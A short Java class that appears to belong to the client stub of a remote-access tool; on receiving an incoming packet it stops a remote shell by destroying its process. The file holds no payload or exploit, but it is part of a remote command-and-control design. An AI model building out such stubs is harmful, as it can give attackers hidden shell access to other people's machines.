package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.stub.RemoteShell;

public class Packet24RemoteShellStop extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		RemoteShell.p.destroy();
	}

}
